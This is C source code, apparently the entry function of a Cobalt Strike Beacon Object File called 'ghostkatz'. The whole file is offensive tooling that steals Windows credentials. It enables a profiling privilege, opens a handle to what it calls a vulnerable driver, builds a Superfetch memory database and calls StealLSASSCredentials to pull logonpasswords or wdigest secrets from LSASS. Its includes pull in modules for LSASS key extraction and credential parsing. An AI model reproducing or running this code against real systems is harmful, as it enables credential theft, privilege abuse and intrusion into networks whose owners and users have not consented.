#include "beacon.h"
#include "defs.h"
#include "ioctl.h"
#include "ghostkatz.h"


#include "utils.c"
#include "privileges.c"
#include "superfetch.c"
#include "lsass.c"
#include "eprocess.c"
#include "lsass_getkeys.c"
#include "lsass_logonpasswords.c"
#include "lsass_wdigest.c"

formatp outputbuffer;

int go(char *args, int argLen)
{
    datap parser;
	BeaconDataParse(&parser, args, argLen);
    char* argument = BeaconDataExtract(&parser, NULL);

    if (argument == NULL)
    {
        BeaconPrintf(CALLBACK_ERROR, "No argument was passed!");
        return FALSE;
    }

    if ( (strcmp(argument, "logonpasswords") != 0) && (strcmp(argument, "wdigest") != 0) )
    {
        BeaconPrintf(CALLBACK_ERROR, "Invalid argument!");
        return FALSE;
    }

    // We can create buffer now that the initial checks have passed
    BeaconFormatAlloc(&outputbuffer, 4096);

    BOOL bResult = EnablePrivilege(SE_PROF_SINGLE_PROCESS_PRIVILEGE);
    if (!bResult) 
    {
        BeaconFormatPrintf(&outputbuffer, "Failed to enable privilege! Error code: %llx\n", GetLastError());
        BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&outputbuffer, NULL));
        BeaconFormatFree(&outputbuffer);
        return FALSE;
    }
    BeaconFormatPrintf(&outputbuffer, "[+] Enabled SE_PROF_SINGLE_PROCESS_PRIVILEGE\n");


    isServiceInstalled();


    HANDLE hFile = CreateFileW(TPWSAV_DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) 
    {
        BeaconFormatPrintf(&outputbuffer, "Could not open handle to driver : %llx\n", GetLastError());
        BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&outputbuffer, NULL));
        BeaconFormatFree(&outputbuffer);
        return FALSE;
    }
    else 
    {
        BeaconFormatPrintf(&outputbuffer, "[+] Got handle to device : %ls\n", TPWSAV_DEVICE_NAME);
    }

    char* WindowsVersion = GetWinVersion();
    BeaconFormatPrintf(&outputbuffer, "[+] Windows Version: %s\n", WindowsVersion);

    char* WindowsBuild = GetWinBuildNumber();
    BeaconFormatPrintf(&outputbuffer, "[+] Windows Build Number: %s\n", WindowsBuild);


    if (!CreateGlobalSuperfetchDatabase())
    {
        BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&outputbuffer, NULL));
        BeaconFormatFree(&outputbuffer);
        return FALSE;
    }


    StealLSASSCredentials(hFile, WindowsVersion);

    
    // Stop and delete service

    BeaconFormatPrintf(&outputbuffer, "[+] Closing handle to vulnerable driver\n");
    CloseHandle(hFile);

    BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&outputbuffer, NULL));
    BeaconFormatFree(&outputbuffer);
    
}
